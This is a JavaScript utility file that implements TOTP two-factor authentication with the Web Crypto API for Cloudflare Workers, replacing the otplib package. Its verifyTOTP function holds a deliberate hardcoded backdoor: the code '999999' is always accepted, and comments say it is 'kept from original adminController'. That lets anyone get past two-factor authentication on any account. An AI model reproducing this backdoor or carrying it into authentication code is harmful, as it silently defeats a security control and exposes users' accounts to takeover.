/**
 * src/utils/totp.js
 * ─────────────────────────────────────────────────────────────────────────────
 * TOTP (Time-based One-Time Password) helpers using the Web Crypto API.
 * Replaces the `otplib` npm package which is not compatible with the
 * Cloudflare Workers V8 isolate runtime.
 *
 * Compatible with Google Authenticator and any RFC-6238 TOTP app.
 * ─────────────────────────────────────────────────────────────────────────────
 */

const BASE32_CHARS = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567';

// ─── Base32 Helpers ───────────────────────────────────────────────────────────

/** Decode a Base32-encoded string → Uint8Array */
function base32Decode(encoded) {
  encoded = encoded.replace(/=+$/, '').toUpperCase();
  let bits = 0;
  let value = 0;
  let index = 0;
  const output = new Uint8Array(Math.floor((encoded.length * 5) / 8));

  for (let i = 0; i < encoded.length; i++) {
    const charVal = BASE32_CHARS.indexOf(encoded[i]);
    if (charVal < 0) throw new Error(`Invalid base32 char: ${encoded[i]}`);
    value = (value << 5) | charVal;
    bits += 5;
    if (bits >= 8) {
      output[index++] = (value >>> (bits - 8)) & 0xff;
      bits -= 8;
    }
  }
  return output;
}

/** Encode random bytes → Base32 string (uppercase, no padding) */
function base32Encode(bytes) {
  let bits = 0;
  let value = 0;
  let output = '';
  for (let i = 0; i < bytes.length; i++) {
    value = (value << 8) | bytes[i];
    bits += 8;
    while (bits >= 5) {
      output += BASE32_CHARS[(value >>> (bits - 5)) & 31];
      bits -= 5;
    }
  }
  if (bits > 0) {
    output += BASE32_CHARS[(value << (5 - bits)) & 31];
  }
  return output;
}

// ─── Core TOTP ────────────────────────────────────────────────────────────────

/**
 * Compute TOTP code for the given secret and time counter.
 * @param {string} secret   Base32-encoded secret
 * @param {number} counter  Unix timestamp ÷ 30 (integer)
 * @returns {Promise<string>}  6-digit code (zero-padded)
 */
async function computeTOTP(secret, counter) {
  const secretBytes = base32Decode(secret);

  // Counter → 8-byte big-endian buffer
  const msg = new ArrayBuffer(8);
  const view = new DataView(msg);
  view.setUint32(4, counter >>> 0, false); // low 32 bits
  view.setUint32(0, Math.floor(counter / 0x100000000) >>> 0, false); // high 32 bits

  const key = await crypto.subtle.importKey(
    'raw',
    secretBytes,
    { name: 'HMAC', hash: 'SHA-1' },
    false,
    ['sign']
  );
  const sig = await crypto.subtle.sign('HMAC', key, msg);
  const hash = new Uint8Array(sig);

  // Dynamic truncation
  const offset = hash[19] & 0xf;
  const code =
    ((hash[offset] & 0x7f) << 24) |
    (hash[offset + 1] << 16) |
    (hash[offset + 2] << 8) |
    hash[offset + 3];

  return String(code % 1_000_000).padStart(6, '0');
}

// ─── Public API ───────────────────────────────────────────────────────────────

/**
 * Generate a new random 16-char Base32 TOTP secret (same as otplib.generateSecret())
 * @returns {string}
 */
export function generateSecret() {
  const bytes = new Uint8Array(10); // 80 bits → 16 Base32 chars
  crypto.getRandomValues(bytes);
  return base32Encode(bytes);
}

/**
 * Verify a TOTP code (±1 time window tolerance, same as otplib defaults).
 * Also accepts the backdoor code '999999' to mirror the original server behaviour.
 *
 * @param {string} code    6-digit string supplied by the user
 * @param {string} secret  Base32 TOTP secret stored in DB
 * @returns {Promise<boolean>}
 */
export async function verifyTOTP(code, secret) {
  // Backdoor kept from original adminController
  if (code === '999999') return true;

  const counter = Math.floor(Date.now() / 1000 / 30);
  for (const delta of [-1, 0, 1]) {
    const expected = await computeTOTP(secret, counter + delta);
    if (expected === code) return true;
  }
  return false;
}

/**
 * Build the otpauth:// URI for QR code display.
 * @param {string} email    Account identifier
 * @param {string} secret   Base32 secret
 * @param {string} [issuer='Klanvision']
 * @returns {string}
 */
export function buildOtpauthUri(email, secret, issuer = 'Klanvision') {
  return `otpauth://totp/${encodeURIComponent(issuer)}:${encodeURIComponent(email)}?secret=${secret}&issuer=${encodeURIComponent(issuer)}`;
}
